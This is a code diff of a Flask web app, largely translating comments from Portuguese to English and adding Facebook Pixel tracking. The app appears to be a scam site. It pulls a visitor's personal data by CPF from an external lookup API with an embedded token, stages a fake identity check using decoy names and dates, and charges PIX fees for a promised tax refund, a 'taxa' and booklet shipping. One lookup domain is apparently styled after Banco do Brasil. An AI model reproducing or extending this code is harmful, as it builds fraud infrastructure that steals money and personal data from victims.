@@ -1,4 +1,4 @@
-# Imports e configuração básica
+# Imports and basic configuration
 import os
 import requests
 import logging
@@ -12,6 +12,7 @@ from flask_caching import Cache
 from flask_sqlalchemy import SQLAlchemy
 from flask_migrate import Migrate
 from services.payment_api import create_payment_api # Added import statement
+from services.facebook_pixel import FacebookPixel # Add to imports section
 
 # Add format_phone_number function after imports
 def format_phone_number(phone: str) -> str:
@@ -35,40 +36,43 @@ def format_phone_number(phone: str) -> str:
 
 def generate_random_phone() -> str:
     """
-    Gera um número de telefone aleatório no formato brasileiro aceito pela API
+    Generates a random phone number in the Brazilian format accepted by the API
     """
     ddd = str(random.randint(11, 99))
-    # Gera 8 dígitos para o número
+    # Generates 8 digits for the number
     numero = ''.join([str(random.randint(0, 9)) for _ in range(8)])
     return f"{ddd}{numero}"
 
 
 def get_test_mode() -> bool:
-    """Verifica se o modo de teste está ativo"""
+    """Checks if the test mode is active"""
     return os.environ.get('TEST_MODE', 'false').lower() == 'true'
 
-# Configuração do logging
+# Logging configuration
 logging.basicConfig(level=logging.DEBUG)
 logger = logging.getLogger(__name__)
 
-# Verificação das variáveis de ambiente
+# Verification of environment variables
 database_url = os.environ.get("DATABASE_URL")
 if not database_url:
     raise ValueError("DATABASE_URL environment variable is not set")
 logger.info(f"Database URL found: {database_url.split(':')[0]}")
 
-# Inicialização do Flask e configurações
+# Flask initialization and configurations
 app = Flask(__name__)
 app.secret_key = os.environ.get("FLASK_SECRET_KEY")
 app.static_folder = 'static'
 
-# Configuração do cache
+# Add after app initialization (after line 61: app = Flask(__name__))
+facebook_pixel = FacebookPixel(os.environ.get('FACEBOOK_PIXEL_ID', ''))
+
+# Cache configuration
 cache = Cache(app, config={
     'CACHE_TYPE': 'simple',
     'CACHE_DEFAULT_TIMEOUT': 600
 })
 
-# Configuração do SQLAlchemy
+# SQLAlchemy configuration
 app.config["SQLALCHEMY_DATABASE_URI"] = database_url
 app.config["SQLALCHEMY_ENGINE_OPTIONS"] = {
     "pool_size": 5,
@@ -80,15 +84,15 @@ app.config["SQLALCHEMY_ENGINE_OPTIONS"] = {
 app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
 
 logger.info("Initializing SQLAlchemy with configuration")
-# Inicialização do SQLAlchemy e Flask-Migrate
+# Initialization of SQLAlchemy and Flask-Migrate
 db = SQLAlchemy(app)
 migrate = Migrate(app, db)
 logger.info("SQLAlchemy and Flask-Migrate initialized successfully")
 
-# Importa os modelos após a inicialização do db
+# Imports the models after the db initialization
 from models import Usuario, Pagamento  # noqa
 
-# Cria as tabelas no banco de dados
+# Creates the tables in the database
 with app.app_context():
     try:
         logger.info("Attempting to create database tables")
@@ -98,9 +102,9 @@ with app.app_context():
         logger.error(f"Error creating database tables: {str(e)}")
         raise
 
-# Middleware de compressão
+# Compression middleware
 def gzip_response(response):
-    # Não comprimir arquivos estáticos
+    # Do not compress static files
     if request.path.startswith('/static/'):
         return response
 
@@ -112,7 +116,7 @@ def gzip_response(response):
         'Content-Encoding' in response.headers):
         return response
 
-    # Só comprimir se a resposta tiver dados
+    # Only compress if the response has data
     if not response.data:
         return response
 
@@ -122,7 +126,7 @@ def gzip_response(response):
         response.headers['Content-Encoding'] = 'gzip'
         response.headers['Content-Length'] = len(response.data)
     except Exception as e:
-        logger.error(f"Erro na compressão: {str(e)}")
+        logger.error(f"Error in compression: {str(e)}")
         return response
 
     return response
@@ -130,6 +134,11 @@ def gzip_response(response):
 @app.after_request
 def after_request(response):
     return gzip_response(response)
+
+# Add after middleware configuration (after line 132: return gzip_response(response))
+@app.after_request
+def after_request_pixel(response):
+    return facebook_pixel.inject_base_code(response)
 
 API_URL = "https://consulta.fontesderenda.blog/?token=4da265ab-0452-4f87-86be-8d83a04a745a&cpf={cpf}"
 
@@ -163,7 +172,7 @@ ESTADOS = {
     'Tocantins': 'TO'
 }
 
-# Adiciona dicionário de companhias elétricas por estado
+# Adds dictionary of electric companies by state
 COMPANHIAS_ELETRICAS = {
     'AC': [{'id': 'energisa_ac', 'nome': 'Energisa Acre'}],
     'AL': [{'id': 'equatorial_al', 'nome': 'Equatorial Alagoas'}],
@@ -204,7 +213,7 @@ COMPANHIAS_ELETRICAS = {
 
 def get_estado_from_ip(ip_address: str) -> str:
     """
-    Obtém o estado baseado no IP do usuário usando um serviço de geolocalização
+    Gets the state based on the user's IP using a geolocation service
     """
     try:
         response = requests.get(f'http://ip-api.com/json/{ip_address}', timeout=5)
@@ -212,19 +221,19 @@ def get_estado_from_ip(ip_address: str) -> str:
             data = response.json()
             if data.get('status') == 'success' and data.get('country') == 'Brazil':
                 estado = data.get('region')
-                # Procura o estado no dicionário de mapeamento
+                # Searches for the state in the mapping dictionary
                 for estado_nome, sigla in ESTADOS.items():
                     if sigla == estado:
                         return f"{estado_nome} - {sigla}"
     except Exception as e:
-        logger.error(f"Erro ao obter localização do IP: {str(e)}")
+        logger.error(f"Error getting IP location: {str(e)}")
 
-    # Se não conseguir determinar o estado, retorna São Paulo como padrão
+    # If it cannot determine the state, it returns São Paulo as default
     return "São Paulo - SP"
 
 def get_client_ip() -> str:
     """
-    Obtém o IP do cliente, considerando possíveis proxies
+    Gets the client's IP, considering possible proxies
     """
     if request.headers.get('X-Forwarded-For'):
         ip = request.headers.get('X-Forwarded-For').split(',')[0]
@@ -245,16 +254,16 @@ def gerar_nomes_falsos(nome_real: str) -> list:
         "PEDRO ALMEIDA COSTA",
         "LUCAS CARVALHO LIMA"
     ]
-    # Remove nomes que são muito similares ao nome real
+    # Remove names that are very similar to the real name
     nomes = [n for n in nomes if len(set(n.split()) & set(nome_real.split())) == 0]
-    # Seleciona 2 nomes aleatórios
+    # Selects 2 random names
     nomes_falsos = random.sample(nomes, 2)
-    # Adiciona o nome real e embaralha
+    # Adds the real name and shuffles
     todos_nomes = nomes_falsos + [nome_real]
     random.shuffle(todos_nomes)
     return todos_nomes
 
-# Função auxiliar para gerar datas falsas
+# Auxiliary function to generate false dates
 def gerar_datas_falsas(data_real_str: str) -> List[str]:
     data_real = datetime.strptime(data_real_str.split()[0], '%Y-%m-%d')
     datas_falsas = []
@@ -302,8 +311,8 @@ def consultar_cpf():
             return redirect(url_for('index'))
 
     except Exception as e:
-        logger.error(f"Erro na consulta: {str(e)}")
-        flash('Erro ao consultar CPF. Por favor, tente novamente.')
+        logger.error(f"Error in the consultation: {str(e)}")
+        flash('Error consulting CPF. Please try again.')
         return redirect(url_for('index'))
 
 @app.route('/verificar_nome', methods=['POST'])
@@ -312,14 +321,14 @@ def verificar_nome():
     dados_usuario = session.get('dados_usuario')
 
     if not dados_usuario or not nome_selecionado:
-        flash('Sessão expirada. Por favor, faça a consulta novamente.')
+        flash('Session expired. Please make the query again.')
         return redirect(url_for('index'))
 
     if nome_selecionado != dados_usuario['nome_real']:
-        flash('Nome selecionado incorreto. Por favor, tente novamente.')
+        flash('Incorrect name selected. Please try again.')
         return redirect(url_for('index'))
 
-    # Gera datas falsas para a próxima etapa
+    # Generates false dates for the next stage
     datas = gerar_datas_falsas(dados_usuario['data_nasc'])
     dados_usuario['datas'] = datas
     session['dados_usuario'] = dados_usuario
@@ -334,18 +343,18 @@ def verificar_data():
     dados_usuario = session.get('dados_usuario')
 
     if not dados_usuario or not data_selecionada:
-        flash('Sessão expirada. Por favor, faça a consulta novamente.')
+        flash('Session expired. Please make the query again.')
         return redirect(url_for('index'))
 
     data_real = datetime.strptime(dados_usuario['data_nasc'].split()[0], '%Y-%m-%d').strftime('%d/%m/%Y')
     if data_selecionada != data_real:
-        flash('Data selecionada incorreta. Por favor, tente novamente.')
+        flash('Incorrect date selected. Please try again.')
         return redirect(url_for('index'))
 
-    # Obtém o estado baseado no IP do usuário
+    # Gets the state based on the user's IP
     ip_address = get_client_ip()
     estado_detectado = get_estado_from_ip(ip_address)
-    logger.info(f"Estado detectado para IP {ip_address}: {estado_detectado}")
+    logger.info(f"State detected for IP {ip_address}: {estado_detectado}")
 
     return render_template('confirmar_dados.html',
                          estado_detectado=estado_detectado,
@@ -354,7 +363,7 @@ def verificar_data():
 
 @app.route('/api/companhias/<estado>')
 def get_companhias(estado):
-    """Retorna a lista de companhias elétricas para um estado específico"""
+    """Returns the list of electric companies for a specific state"""
     companhias = COMPANHIAS_ELETRICAS.get(estado.upper(), [])
     return jsonify(companhias)
 
@@ -367,21 +376,21 @@ def confirmar_dados():
     dados_usuario = session.get('dados_usuario')
 
     if not dados_usuario or not estado or not companhia_id or not email or not telefone:
-        flash('Sessão expirada ou dados incompletos. Por favor, tente novamente.')
+        flash('Session expired or incomplete data. Please try again.')
         return redirect(url_for('index'))
 
-    # Encontra o nome da companhia selecionada
+    # Finds the name of the selected company
     companhias = COMPANHIAS_ELETRICAS.get(estado, [])
     companhia_nome = next((c['nome'] for c in companhias if c['id'] == companhia_id), None)
 
     if not companhia_nome:
-        flash('Companhia elétrica inválida. Por favor, tente novamente.')
+        flash('Invalid electric company. Please try again.')
         return render_template('confirmar_dados.html',
                             estado_detectado=estado,
                             companhias=companhias,
                             current_year=datetime.now().year)
 
-    # Salva os dados de localização e contato na sessão
+    # Saves the location and contact data in the session
     dados_usuario['estado'] = estado
     dados_usuario['companhia'] = {
         'id': companhia_id,
@@ -391,20 +400,20 @@ def confirmar_dados():
     dados_usuario['telefone'] = telefone
     session['dados_usuario'] = dados_usuario
 
-    # Redireciona para a página de análise
+    # Redirects to the analysis page
     return redirect(url_for('analise_dados'))
 
 
 @app.route('/analise_dados')
 def analise_dados():
-    """Rota para a página de análise de dados e aprovação"""
+    """Route for the data analysis and approval page"""
     user_data = session.get('dados_usuario')
     if not user_data:
-        flash('Sessão expirada. Por favor, faça a consulta novamente.')
+        flash('Session expired. Please make the query again.')
         return redirect(url_for('index'))
 
     test_mode = get_test_mode()
-    logger.info(f"Análise de dados - TEST_MODE: {test_mode}")
+    logger.info(f"Data analysis - TEST_MODE: {test_mode}")
 
     return render_template('analise_dados.html',
                          user_data=user_data,
@@ -414,10 +423,10 @@ def analise_dados():
 
 @app.route('/retirada_restituicao')
 def retirada_restituicao():
-    """Rota para a página de retirada da restituição"""
+    """Route for the restitution withdrawal page"""
     user_data = session.get('dados_usuario')
     if not user_data:
-        flash('Sessão expirada. Por favor, faça a consulta novamente.')
+        flash('Session expired. Please make the query again.')
         return redirect(url_for('index'))
 
     return render_template('retirada_restituicao.html',
@@ -426,19 +435,19 @@ def retirada_restituicao():
 
 @app.route('/processar_retirada', methods=['POST'])
 def processar_retirada():
-    """Rota para processar a solicitação de retirada"""
+    """Route to process the withdrawal request"""
     user_data = session.get('dados_usuario')
     if not user_data:
-        flash('Sessão expirada. Por favor, faça a consulta novamente.')
+        flash('Session expired. Please make the query again.')
         return redirect(url_for('retirada_restituicao'))
 
     confirma_dados = request.form.get('confirma_dados')
     if not confirma_dados:
-        flash('É necessário confirmar os dados para prosseguir.')
+        flash('It is necessary to confirm the data to proceed.')
         return redirect(url_for('retirada_restituicao'))
 
     test_mode = get_test_mode()
-    logger.info(f"Processando retirada - TEST_MODE: {test_mode}")
+    logger.info(f"Processing withdrawal - TEST_MODE: {test_mode}")
 
     return render_template('processando_retirada.html',
                          user_data=user_data,
@@ -451,14 +460,14 @@ def selecionar_estado():
     dados_usuario = session.get('dados_usuario')
 
     if not dados_usuario or not estado:
-        flash('Sessão expirada. Por favor, faça a consulta novamente.')
+        flash('Session expired. Please make the query again.')
         return redirect(url_for('index'))
 
-    # Salva o estado selecionado na sessão
+    # Saves the selected state in the session
     dados_usuario['estado'] = estado
     session['dados_usuario'] = dados_usuario
 
-    # Redireciona para a seleção de nível, passando o estado selecionado
+    # Redirects to the level selection, passing the selected state
     return render_template('selecionar_nivel.html', 
                          estado=estado,
                          current_year=datetime.now().year)
@@ -469,14 +478,14 @@ def selecionar_nivel():
     dados_usuario = session.get('dados_usuario')
 
     if not dados_usuario or not nivel:
-        flash('Sessão expirada. Por favor, faça a consulta novamente.')
+        flash('Session expired. Please make the query again.')
         return redirect(url_for('index'))
 
-    # Salva o nível selecionado na sessão
+    # Saves the selected level in the session
     dados_usuario['nivel'] = nivel
     session['dados_usuario'] = dados_usuario
 
-    # Redireciona para a página de contato
+    # Redirects to the contact page
     return render_template('verificar_contato.html',
                          dados={
                              'name': dados_usuario['nome_real'],
@@ -492,26 +501,26 @@ def verificar_contato():
     dados_usuario = session.get('dados_usuario')
 
     if not dados_usuario or not email or not telefone:
-        flash('Sessão expirada ou dados incompletos. Por favor, tente novamente.')
+        flash('Session expired or incomplete data. Please try again.')
         return redirect(url_for('index'))
 
-    # Adiciona os dados de contato ao objeto dados_usuario
+    # Adds the contact data to the dados_usuario object
     dados_usuario['email'] = email
-    dados_usuario['phone'] = ''.join(filter(str.isdigit, telefone))  # Remove formatação
+    dados_usuario['phone'] = ''.join(filter(str.isdigit, telefone))  # Removes formatting
     session['dados_usuario'] = dados_usuario
 
-    # Redireciona para a página de endereço
+    # Redirects to the address page
     return redirect(url_for('verificar_endereco'))
 
 @app.route('/verificar_endereco', methods=['GET', 'POST'])
 def verificar_endereco():
     dados_usuario = session.get('dados_usuario')
     if not dados_usuario:
-        flash('Sessão expirada. Por favor, faça a consulta novamente.')
+        flash('Session expired. Please make the query again.')
         return redirect(url_for('index'))
 
     if request.method == 'POST':
-        # Coleta os dados do formulário
+        # Collects the data from the form
         endereco = {
             'cep': request.form.get('cep'),
             'logradouro': request.form.get('logradouro'),
@@ -522,18 +531,18 @@ def verificar_endereco():
             'estado': request.form.get('estado')
         }
 
-        # Valida se os campos obrigatórios foram preenchidos
+        # Validates if the required fields have been filled in
         campos_obrigatorios = ['cep', 'logradouro', 'numero', 'bairro', 'cidade', 'estado']
         if not all(endereco.get(campo) for campo in campos_obrigatorios):
-            flash('Por favor, preencha todos os campos obrigatórios.')
+            flash('Please fill in all required fields.')
             return render_template('verificar_endereco.html', 
                                 current_year=datetime.now().year)
 
-        # Adiciona o endereço aos dados do usuário
+        # Adds the address to the user's data
         dados_usuario['endereco'] = endereco
         session['dados_usuario'] = dados_usuario
 
-        # Redireciona para a página de aviso de pagamento
+        # Redirects to the payment notice page
         return render_template('aviso_pagamento.html',
                             dados={'name': dados_usuario['nome_real'],
                                   'email': dados_usuario['email'],
@@ -543,7 +552,7 @@ def verificar_endereco():
                             current_month=str(datetime.now().month).zfill(2),
                             current_day=str(datetime.now().day).zfill(2))
 
-    # GET request - mostra o formulário
+    # GET request - shows the form
     return render_template('verificar_endereco.html',
                          current_year=datetime.now().year)
 
@@ -553,22 +562,22 @@ def pagamento():
     try:
         user_data = session.get('dados_usuario')
         if not user_data:
-            flash('Sessão expirada. Por favor, faça a consulta novamente.')
+            flash('Session expired. Please make the query again.')
             return render_template('pagamento.html',
-                                error="Sessão expirada",
+                                error="Session expired",
                                 pix_data={},
                                 valor_total="78,40",
                                 current_year=datetime.now().year)
 
         payment_api = create_payment_api()
 
-        # Formata o telefone adequadamente - apenas números
+        # Formats the phone correctly - only numbers
         phone = format_phone_number(user_data.get('phone', ''))
         if not phone or len(phone) < 8:
             phone = generate_random_phone()
             logger.info(f"Generated valid phone number: {phone}")
 
-        # Garante que temos um email válido
+        # Ensures that we have a valid email
         email = user_data.get('email', '')
         if not email or '@' not in email:
             email = f"user_{user_data['cpf']}@email.com"
@@ -582,14 +591,14 @@ def pagamento():
             'amount': 78.40
         }
 
-        logger.info(f"Enviando dados para API de pagamento: {payment_data}")
+        logger.info(f"Sending data to payment API: {payment_data}")
 
         try:
             pix_data = payment_api.create_pix_payment(payment_data)
-            logger.info(f"Resposta da API de pagamento: {pix_data}")
+            logger.info(f"Response from payment API: {pix_data}")
 
             if not pix_data:
-                raise ValueError("Falha ao gerar dados do PIX")
+                raise ValueError("Failure to generate PIX data")
 
             return render_template('pagamento.html',
                                 pix_data=pix_data,
@@ -597,7 +606,7 @@ def pagamento():
                                 current_year=datetime.now().year)
 
         except Exception as e:
-            logger.error(f"Erro específico na criação do PIX: {str(e)}")
+            logger.error(f"Specific error in PIX creation: {str(e)}")
             return render_template('pagamento.html',
                                 error=str(e),
                                 pix_data={},
@@ -605,7 +614,7 @@ def pagamento():
                                 current_year=datetime.now().year)
 
     except Exception as e:
-        logger.error(f"Erro geral na rota de pagamento: {str(e)}")
+        logger.error(f"General error in payment route: {str(e)}")
         return render_template('pagamento.html',
                             error=str(e),
                             pix_data={},
@@ -623,7 +632,7 @@ def check_payment(payment_id):
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
 @app.route('/')
-@cache.cached(timeout=60)  # Cache da página inicial por 1 minuto
+@cache.cached(timeout=60)  # Cache of the home page for 1 minute
 def index():
     today = datetime.now()
     logger.debug(f"Current date - Year: {today.year}, Month: {today.month}, Day: {today.day}")
@@ -637,12 +646,12 @@ def index():
 def frete_apostila():
     user_data = session.get('dados_usuario') 
     if not user_data:
-        flash('Sessão expirada. Por favor, faça a consulta novamente.')
+        flash('Session expired. Please make the query again.')
         return redirect(url_for('index'))
 
     if request.method == 'POST':
         try:
-            # Coleta os dados do formulário
+            # Collects the data from the form
             endereco = {
                 'cep': request.form.get('cep'),
                 'logradouro': request.form.get('street'),
@@ -653,26 +662,26 @@ def frete_apostila():
                 'estado': request.form.get('state')
             }
 
-            # Valida se os campos obrigatórios foram preenchidos
+            # Validates if the required fields have been filled in
             campos_obrigatorios = ['cep', 'logradouro', 'numero', 'bairro', 'cidade', 'estado']
             if not all(endereco.get(campo) for campo in campos_obrigatorios):
-                flash('Por favor, preencha todos os campos obrigatórios.')
+                flash('Please fill in all required fields.')
                 return render_template('frete_apostila.html', 
                                    user_data=user_data,
                                    current_year=datetime.now().year)
 
-            # Salva o endereço na sessão
+            # Saves the address in the session
             user_data['endereco'] = endereco
             session['dados_usuario'] = user_data
 
-            # Gera o pagamento PIX
+            # Generates the PIX payment
             payment_api = create_payment_api()
             payment_data = {
                 'name': user_data['nome_real'], 
                 'email': user_data.get('email', generate_random_email()), 
                 'cpf': user_data['cpf'],
                 'phone': user_data.get('phone', generate_random_phone()), 
-                'amount': 48.19  # Valor do frete
+                'amount': 48.19  # Shipping cost
             }
 
             pix_data = payment_api.create_pix_payment(payment_data)
@@ -682,8 +691,8 @@ def frete_apostila():
                                current_year=datetime.now().year)
 
         except Exception as e:
-            logger.error(f"Erro ao processar formulário: {e}")
-            flash('Erro ao processar o formulário. Por favor, tente novamente.')
+            logger.error(f"Error processing form: {e}")
+            flash('Error processing the form. Please try again.')
             return redirect(url_for('frete_apostila'))
 
     return render_template('frete_apostila.html', 
@@ -695,16 +704,16 @@ def pagamento_categoria():
     try:
         user_data = session.get('dados_usuario') 
         if not user_data:
-            flash('Sessão expirada. Por favor, faça a consulta novamente.')
+            flash('Session expired. Please make the query again.')
             return render_template('pagamento_categoria.html',
-                               error="Sessão expirada",
+                               error="Session expired",
                                categoria='',
                                current_year=datetime.now().year)
 
         categoria = request.form.get('categoria')
         if not categoria:
             return render_template('pagamento_categoria.html',
-                               error="Categoria não especificada",
+                               error="Category not specified",
                                categoria='',
                                current_year=datetime.now().year)
 
@@ -721,7 +730,7 @@ def pagamento_categoria():
             pix_data = payment_api.create_pix_payment(payment_data)
 
             if not pix_data:
-                raise ValueError("Falha ao gerar dados do PIX")
+                raise ValueError("Failure to generate PIX data")
 
             return render_template('pagamento_categoria.html',
                                pix_data=pix_data,
@@ -730,45 +739,71 @@ def pagamento_categoria():
                                current_year=datetime.now().year)
 
         except Exception as e:
-            logger.error(f"Erro ao gerar pagamento da categoria: {e}")
+            logger.error(f"Error generating category payment: {e}")
             return render_template('pagamento_categoria.html',
-                               error=f"Erro ao gerar pagamento: {str(e)}",
+                               error=f"Error generating payment: {str(e)}",
                                categoria=categoria,
                                pix_data={}, 
                                current_year=datetime.now().year)
 
     except Exception as e:
-        logger.error(f"Erro geral na rota de pagamento categoria: {e}")
+        logger.error(f"General error in category payment route: {e}")
         return render_template('pagamento_categoria.html',
-                           error=f"Erro ao processar pagamento: {str(e)}",
+                           error=f"Error processing payment: {str(e)}",
                            categoria='',
                            pix_data={}, 
                            current_year=datetime.now().year)
 
+# Modify the obrigado route to include purchase event with correct value
 @app.route('/obrigado')
-@cache.cached(timeout=300)  # Cache por 5 minutos
+@cache.cached(timeout=300)  # Cache for 5 minutes
 def obrigado():
     user_data = session.get('dados_usuario') 
     if not user_data:
-        flash('Sessão expirada. Por favor, faça a consulta novamente.')
+        flash('Session expired. Please make the query again.')
         return redirect(url_for('index'))
-    return render_template('obrigado.html', 
-                         current_year=datetime.now().year,
-                         user_data=user_data,
-                         datetime=datetime)
+
+    # Add purchase event for completed payment
+    purchase_script = ""
+    if user_data:
+        user_info = {
+            'email': user_data.get('email', ''),
+            'phone': user_data.get('telefone', ''),
+            'name': user_data.get('nome_real', '')
+        }
+        purchase_script = facebook_pixel.get_purchase_event_script(
+            value=114.10,  # Value of Correios registration
+            currency='BRL',
+            content_type='product',
+            transaction_id=user_data.get('cpf', ''),  # Using CPF as transaction ID
+            user_data=user_info
+        )
+
+    response = render_template('obrigado.html', 
+                          current_year=datetime.now().year,
+                          user_data=user_data,
+                          datetime=datetime)
+
+    if hasattr(response, 'get_data'):
+        html = response.get_data(as_text=True)
+        if '</body>' in html:
+            html = html.replace('</body>', f'{purchase_script}</body>')
+            response.set_data(html)
+
+    return response
 
 @app.route('/categoria/<tipo>')
 def categoria(tipo):
     user_data = session.get('dados_usuario')
     if not user_data:
-        flash('Sessão expirada. Por favor, faça a consulta novamente.')
+        flash('Session expired. Please make the query again.')
         return redirect(url_for('index'))
     return render_template(f'categoria_{tipo}.html', 
                          current_year=datetime.now().year,
                          user_data=user_data)
 
 @app.route('/taxa')
-@cache.cached(timeout=300)  # Cache por 5 minutos
+@cache.cached(timeout=300)  # Cache for 5 minutes
 def taxa():
     return render_template('taxa.html', current_year=datetime.now().year)
 
@@ -782,7 +817,7 @@ def verificar_taxa():
         return redirect(url_for('taxa'))
 
     try:
-        # Consulta à API
+        # Query to the API
         response = requests.get(
             f"https://inscricao-bb.org/api_clientes.php?cpf={cpf_numerico}",
             timeout=30
@@ -813,16 +848,16 @@ def verificar_taxa():
                                     pix_data=pix_data,
                                     current_year=datetime.now().year)
             except Exception as e:
-                logger.error(f"Erro ao gerar pagamento: {e}")
-                flash('Erro ao gerar o pagamento. Por favor, tente novamente.')
+                logger.error(f"Error generating payment: {e}")
+                flash('Error generating the payment. Please try again.')
                 return redirect(url_for('taxa'))
         else:
             flash('CPF não encontrado ou dados incompletos.')
             return redirect(url_for('taxa'))
 
     except Exception as e:
-        logger.error(f"Erro na consulta: {str(e)}")
-        flash('Erro ao consultar CPF. Por favor, tente novamente.')
+        logger.error(f"Error in the consultation: {str(e)}")
+        flash('Error consulting CPF. Please try again.')
         return redirect(url_for('taxa'))
 
 @app.route('/pagamento_taxa', methods=['POST'])
@@ -830,7 +865,7 @@ def pagamento_taxa():
     dados = session.get('dados_taxa')
     if not dados:
         return render_template('pagamento.html',
-                           error="Sessão expirada",
+                           error="Session expired",
                            current_year=datetime.now().year)
 
     try:
@@ -850,23 +885,23 @@ def pagamento_taxa():
                            current_year=datetime.now().year)
 
     except Exception as e:
-        logger.error(f"Erro ao gerar pagamento: {e}")
+        logger.error(f"Error generating payment: {e}")
         return render_template('pagamento.html',
-                           error=f"Erro ao gerar pagamento: {str(e)}",
+                           error=f"Error generating payment: {str(e)}",
                            current_year=datetime.now().year)
 
 def generate_random_phone() -> str:
     """
-    Gera um número de telefone aleatório no formato brasileiro aceito pela API
+    Generates a random phone number in the Brazilian format accepted by the API
     """
     ddd = str(random.randint(11, 99))
-    # Gera 8 dígitos para o número (sem o 9 na frente)
+    # Generates 8 digits for the number (without the 9 in front)
     numero = ''.join([str(random.randint(0, 9)) for _ in range(8)])
     return f"{ddd}{numero}"  
 
 def generate_random_email() -> str:
     """
-    Gera um email aleatório para casos onde o usuário não forneceu
+    Generates a random email for cases where the user did not provide
     """
     random_string = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
     return f"{random_string}@temp-mail.org"
